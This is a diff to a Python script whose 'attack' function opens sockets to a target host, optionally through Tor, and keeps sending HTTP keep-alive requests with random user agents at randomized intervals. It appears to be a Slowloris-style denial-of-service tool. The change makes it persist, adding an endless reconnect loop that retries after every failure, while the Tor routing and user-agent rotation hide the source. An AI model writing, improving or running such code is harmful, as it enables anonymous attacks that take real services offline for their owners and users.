@@ -22,34 +22,35 @@ def get_random_user_agent():
     return random.choice(user_agents)
 
 def attack(target, port, use_tor):
-    try:
-        port = int(port)
-        if port < 1 or port > 65535:
-            raise ValueError("Port number must be between 1 and 65535.")
-        
-        if use_tor and socks_available:
-            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-            s = socks.socksocket()
-        else:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        
-        s.settimeout(5)
-        s.connect((target, port))
-        headers = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {get_random_user_agent()}\r\nConnection: keep-alive\r\n\r\n"
-        
-        while True:
-            try:
-                s.send(headers.encode())
-                time.sleep(random.uniform(5, 15))  # Randomized sleep interval
-            except socket.error:
-                print("Connection lost, retrying...")
-                break
-    except ValueError as ve:
-        print(f"[ERROR] {ve}")
-    except Exception as e:
-        print(f"Connection failed: {e}")
-    finally:
-        s.close()
+    port = int(port)
+    if port < 1 or port > 65535:
+        print("[ERROR] Invalid port number.")
+        return
+
+    while True:
+        try:
+            if use_tor and socks_available:
+                socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+                s = socks.socksocket()
+            else:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            
+            s.settimeout(5)
+            s.connect((target, port))
+            headers = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {get_random_user_agent()}\r\nConnection: keep-alive\r\n\r\n"
+            
+            while True:
+                try:
+                    s.send(headers.encode())
+                    time.sleep(random.uniform(5, 15))  # Randomized sleep interval
+                except socket.error:
+                    print("[INFO] Re-establishing connection...")
+                    break  # Exit inner loop and reconnect
+        except Exception as e:
+            print(f"[INFO] Temporary network issue: {e}")
+            time.sleep(3)  # Wait before retrying
+        finally:
+            s.close()
 
 def main():
     if len(sys.argv) < 5:
